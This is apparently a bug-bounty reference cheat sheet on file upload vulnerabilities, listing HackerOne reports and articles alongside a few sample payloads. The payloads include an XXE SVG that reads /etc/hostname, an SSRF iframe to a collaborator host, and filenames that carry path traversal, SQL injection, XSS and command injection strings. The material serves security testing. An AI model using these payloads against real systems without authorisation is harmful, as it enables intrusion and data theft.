1. RCE via File Upload:
```
https://hackerone.com/reports/135072

https://hackerone.com/reports/506646

https://hackerone.com/reports/343726

https://sidblog.medium.com/file-upload-to-rce-7c04b3b252de

https://mukarramkhalid.com/imagemagick-imagetragick-exploit/

https://hackerone.com/reports/343726

https://hackerone.com/reports/135072

https://hackerone.com/reports/412021

https://hackerone.com/reports/237381

https://hackerone.com/reports/237381
```

2. XSS via File Upload:
```
a. XSS via Filename
b. XSS via Metadata
c. XSS via SVG file
d. Blind XSS via SVG

https://brutelogic.com.br/blog/file-upload-xss/

https://gist.github.com/ioribrn/aafd49c7c3a5cc7e1ba4848b75a52f4b

https://hackerone.com/reports/1010466

https://hackerone.com/reports/880099

https://hackerone.com/reports/964550
```

3. SSRF via File Upload:
```
a. SSRF via Filename:
b. SSRF via SVG Upload:
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://example.com/image.jpg" height="200" width="200"/>
</svg>
c. SSRF via Iframe in Html:
<html>
<body>
 <iframe src=”http://collaborator.net" width=”500" height=”500"></iframe>
</body>
</html>

https://hackerone.com/reports/223203

https://hackerone.com/reports/223203

https://github.com/allanlw/svg-cheatsheet

https://shahjerry33.medium.com/server-side-request-forgery-a-forged-document-6359ef25058d
```

4. XXE via File Upload:
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>

https://hackerone.com/reports/897244
```

5. CSRF on File Upload:
```
Steps of Reproduction:
1. Capture the Upload form Request.
2. Create POC with Burp CSRF POC generator.
3. Open that POC html file in different account in different browser
4. And see if File upload is successful in another account.

https://hackerone.com/reports/868572

https://hackerone.com/reports/867473

http://aetherlab.net/2013/04/here-it-is-the-file-upload-csrf/
```

6. Exif MetaData Leakage:
```
Steps for Reproduction:

1) Visit this [Repo](https://github.com/ianare/exif-samples/tree/master/jpg) There are lot of images with metadata.
2) Upload the image to website.
3) Download the uploaded Image from website.
4) Visit this link to check whether exif metadata is not stripped or not. If not then you can report it.

https://hackerone.com/reports/446238

https://hackerone.com/reports/906907

https://kathan19.gitbook.io/howtohunt/exif-geo-data-not-stripped/exif_geo
```

7. OpenRedirect via SVG File Upload:
```
1. Steps of Reproduction:

Save the below code as .svg file.
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://example.com/image.jpg" height="200" width="200"/>
</svg>
2. Upload the file, Try to retrive a file.

https://hackerone.com/reports/368927

https://www.wizlynxgroup.com/security-research-advisories/vuln/WLX-2020-009
```

8. Large File DOS:
```
To check for this issue, one can follow below simple steps:

1. Create a file that is larger in the size than defined upper limit. For example, an image file having a 500 MB file size.
2. Now, upload the file, and if the application accepts the file and starts processing it, browser the application from another device to see if there’s any sluggish behavior or connectivity error.

https://hackerone.com/reports/887321

https://hackerone.com/reports/454
```

9. File Upload Bypass:
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology

https://medium.com/@519udhaya/unrestricted-file-upload-vulnerability-bba4491a08da
```

10. File Name Vulnerability:
```
Path Traversals: ../../../tmp/lol.png
SQL Injection: sleep(10) — -.jpg
XSS: <svg onload=alert(document.comain)>.jpg/png
Command Injection: ; sleep 10;.jpg
DOS: Rename your file to a long string and upload, It may cause DOS.
```

11. Miscellaneous File Upload Attacks:
```
https://owasp.org/www-community/attacks/CSV_Injection

https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/

https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2

https://imagetragick.com/

https://github.com/snyk/zip-slip-vulnerability
```
